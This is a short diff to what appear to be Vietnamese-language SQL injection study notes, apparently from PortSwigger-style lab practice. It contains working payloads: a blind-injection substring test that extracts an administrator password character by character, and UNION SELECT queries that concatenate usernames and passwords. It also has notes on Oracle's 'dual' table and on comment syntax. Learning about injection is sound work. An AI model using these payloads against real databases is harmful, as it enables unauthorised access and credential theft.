@@ -10,6 +10,9 @@ SELECT * FROM v$version : thu thập thông tin về database
 SELECT * FROM information_schema.tables : tìm bảng cnf sống thôi
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm : nếu kí tự đầu tiên của passwd lớn hơn m thì OK đây là dạng blind Sqli
 ' UNION SELECT username || '~' || password FROM users-- : || là để nối chuỗi, khi bạn select từ database thì nó sẽ kiểu admin~hacker ngăn cách nhau bởi dấu ~ nó sẽ cho về 1 cột thay vì 2
+Trong Oracel thì co hàm build-in, SELECT phải chỉ định đến 1 cái table nào đó ms dùng đc FROM, nếu ko có query ở 1 bảng thì ta dùng một kiểu này: UNION SELECT 'abc' FROM dual, phải có dual
+--https://portswigger.net/web-security/sql-injection/cheat-sheet
+Đôi khi hacker còn dùng #
 
 ============
 Phải xác định cột trả về kiểu string đã
